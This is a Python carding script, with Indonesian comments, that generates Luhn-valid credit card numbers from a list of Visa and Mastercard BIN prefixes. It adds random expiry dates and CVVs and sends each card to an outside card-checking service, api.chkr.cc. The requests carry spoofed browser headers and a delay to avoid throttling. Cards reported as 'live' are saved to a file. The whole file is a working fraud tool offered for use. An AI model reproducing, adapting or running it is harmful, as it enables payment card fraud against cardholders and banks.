import random
import string
import requests
import time
from datetime import datetime


API_URL = "https://api.chkr.cc/"
FILE_LIVE = "live_cc.txt"
CARD_PER_BIN = 5      # 1 BIN digenerate jadi 5 kartu
DELAY_SECONDS = 2     # Jeda request biar API gak ngamuk


BIN_LIST = [
    # VISA ADD MORE BIN
    "410689", "427738", 
    
    # MASTERCARD ADD MORE BIN
    "510259", "510284"
]


def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_fake_cc(bin_prefix):
    if bin_prefix.startswith("3"):
        brand = "Amex"
        length = 15
    elif bin_prefix.startswith("4"):
        brand = "Visa"
        length = 16
    elif bin_prefix.startswith("5"):
        brand = "Mastercard"
        length = 16
    else:
        brand = "Unknown"
        length = 16

    random_digits = ''.join(random.choices(string.digits, k=length - len(bin_prefix) - 1))
    partial_number = bin_prefix + random_digits
    
    check_digit = (10 - luhn_checksum(partial_number + "0")) % 10
    card_number = partial_number + str(check_digit)

    now = datetime.now()
    year = random.randint(now.year + 1, now.year + 5)
    month = random.randint(1, 12)
    exp_month = f"{month:02d}"
    exp_year = f"{year}"
    
    cvv_length = 4 if brand == "Amex" else 3
    cvv = ''.join(random.choices(string.digits, k=cvv_length))

    return {
        "brand": brand,
        "number": card_number,
        "exp_month": exp_month,
        "exp_year": exp_year,
        "cvv": cvv
    }

def check_card_api(card_data):
    payload_string = f"{card_data['number']}|{card_data['exp_month']}|{card_data['exp_year']}|{card_data['cvv']}"
    
    payload = {
        "data": payload_string,
        "charge": False
    }
    
    headers = {
        "accept": "*/*",
        "accept-language": "en-US,en;q=0.9,id;q=0.8",
        "content-type": "application/json; charset=utf-8",
        "origin": "https://chkr.cc",
        "priority": "u=1, i",
        "referer": "https://chkr.cc/",
        "sec-ch-ua": '"Google Chrome";v="153", "Not_A Brand";v="8", "Chromium";v="153"',
        "sec-ch-ua-mobile": "?0",
        "sec-ch-ua-platform": '"Linux"',
        "sec-fetch-dest": "empty",
        "sec-fetch-mode": "cors",
        "sec-fetch-site": "same-site",
        "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/153.0.0.0 Safari/537.36"
    }

    try:
        response = requests.post(API_URL, json=payload, headers=headers, timeout=15)
        
        if response.status_code == 200:
            res_data = response.json()
            status = res_data.get("status", "Unknown")
            code = res_data.get("code", 0)
            
            if status == "Live" or code == 1:
                return True, status, res_data.get("card", {})
            else:
                return False, status, None
        else:
            return False, f"HTTP_{response.status_code}", None
            
    except requests.exceptions.RequestException as e:
        return False, "Network_Error", None


if __name__ == "__main__":
    total_cards = len(BIN_LIST) * CARD_PER_BIN
    
    print("=" * 60)
    print("🛠️  MASS BIN GENERATOR & LIVE CHECKER")
    print("=" * 60)
    
    with open(FILE_LIVE, "w", encoding="utf-8") as f:
        pass
        
    print(f"Total BIN       : {len(BIN_LIST)}")
    print(f"Generate per BIN: {CARD_PER_BIN} kartu")
    print(f"Total Kartu     : {total_cards} kartu")
    print(f"File Output     : {FILE_LIVE} (Format: Nomor|MM/YY|CVV)\n")

    live_count = 0
    dead_count = 0
    counter = 0

    for bin_prefix in BIN_LIST:
        print(f"\n--- Menguji BIN: {bin_prefix} ---")
        
        for _ in range(CARD_PER_BIN):
            counter += 1
            card = generate_fake_cc(bin_prefix)
            
            exp_short = f"{card['exp_month']}/{card['exp_year'][-2:]}"
            save_format = f"{card['number']}|{exp_short}|{card['cvv']}"
            
            api_format = f"{card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvv']}"
            
            print(f"[{counter:03d}/{total_cards}] Cek: {api_format} ...", end=" ", flush=True)
            
            is_live, status, card_info = check_card_api(card)
            
            if is_live:
                live_count += 1
                bank_name = card_info.get("bank", "Unknown Bank")
                country = card_info.get("country", {}).get("name", "Unknown")
                
                print(f"✅ LIVE! [{card['brand']}] {bank_name} ({country})")
                
                with open(FILE_LIVE, "a", encoding="utf-8") as f:
                    f.write(f"{save_format}\n")
                    
            else:
                dead_count += 1
                print(f"❌ DEAD ({status})")
                
            time.sleep(DELAY_SECONDS)

    print("\n" + "=" * 60)
    print("📊 HASIL AKHIR:")
    print(f"   ✅ LIVE : {live_count} kartu (disimpan di {FILE_LIVE})")
    print(f"   ❌ DEAD : {dead_count} kartu")
    print("=" * 60)
